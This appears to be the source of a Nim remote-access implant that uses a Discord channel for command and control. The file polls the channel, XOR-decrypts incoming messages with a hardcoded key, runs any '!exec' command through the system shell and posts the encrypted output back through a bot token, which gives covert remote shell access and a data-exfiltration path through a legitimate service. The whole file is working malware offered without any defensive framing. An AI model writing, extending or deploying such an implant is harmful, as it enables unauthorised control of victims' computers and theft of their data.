import std/[httpclient, json, os, osproc, strutils, base64]

let BOT_TOKEN = "{{DISCORD_TOKEN}}"
let CHANNEL_ID = "{{DISCORD_CHANNEL}}"

let VODKAHEX = "{{VODKA_KEY}}"
if VODKAHEX.len == 0:
  quit("VODKA KEY ERROR")
if VODKAHEX.len != 64:
  quit("VODKA KEY MUST BE 64 HEX")

var VODKA_KEY: array[32, byte]
for i in 0..<32:
  VODKA_KEY[i] = parseHexInt(VODKAHEX[i*2 .. i*2+1]).byte

proc xorEncrypt(key: array[32, byte], data: string): string =
  var result = ""
  for i in 0..<data.len:
    result.add(chr(ord(data[i]) xor int(key[i mod 32])))
  return encode(result)

proc xorDecrypt(key: array[32, byte], b64data: string): string =
  let data = decode(b64data)
  var result = ""
  for i in 0..<data.len:
    result.add(chr(ord(data[i]) xor int(key[i mod 32])))
  return result

var lastmessageID = ""

proc send_discord_message(client: HttpClient, content: string) =
  let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages"
  client.headers = newHttpHeaders({
    "Authorization": "Bot " & BOT_TOKEN,
    "Content-Type": "application/json"
  })
  let encrypted = xorEncrypt(VODKA_KEY, content)
  let safe_content = if encrypted.len > 1900: encrypted[0..1900] & "\n.. [finished]" else: encrypted
  let body = %*{"content": "```\n" & safe_content & "\n```"}
  try:
    discard client.postContent(url, $body)
  except Exception as e:
    echo "ERROR: ", e.msg

proc poll_commands() =
  let client = newHttpClient()
  client.headers = newHttpHeaders({"Authorization": "Bot " & BOT_TOKEN})
  while true:
    try:
      let url = "https://discord.com/api/v10/channels/" & CHANNEL_ID & "/messages?limit=1"
      let response = client.getContent(url)
      let jsonResponse = parseJson(response)
      if jsonResponse.len > 0:
        let msg = jsonResponse[0]
        let msgID = msg["id"].getStr()
        let content = msg["content"].getStr()
        if msgID != lastmessageID and not content.startsWith("```"):
          lastmessageID = msgID
          var decrypted = content
          try:
            decrypted = xorDecrypt(VODKA_KEY, content)
          except:
            decrypted = content
          if decrypted.startsWith("!exec ") and decrypted.len >= 7:
            let command = decrypted[6..^1]
            echo "[*] Executing: ", command
            let (output, exitCode) = execCmdEx(command)
            send_discord_message(client, output)
    except Exception as e:
      echo "error: ", e.msg
    sleep(3000)

when isMainModule:
  poll_commands()
